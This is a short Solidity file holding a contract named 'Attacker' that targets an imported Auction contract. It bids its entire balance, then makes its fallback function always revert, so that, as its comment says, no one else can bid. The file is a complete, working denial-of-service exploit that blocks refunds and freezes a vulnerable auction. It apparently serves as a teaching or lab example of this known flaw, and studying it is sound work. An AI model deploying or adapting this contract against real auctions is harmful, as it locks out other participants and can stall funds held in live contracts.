pragma solidity ^0.4.10;
import "auction.sol";
contract Attacker{
    Auction auction;
    address auction_address;
    
    function Attacker (address _address) public payable{
        auction_address = _address;
    }
    
    function bid() public payable{
        auction = Auction(auction_address);
        auction.bid.value(address(this).balance)();
    }
    
    function () public payable {
        //make sure my payable function fails, no one else can bid
        require(0!=0);
    }
}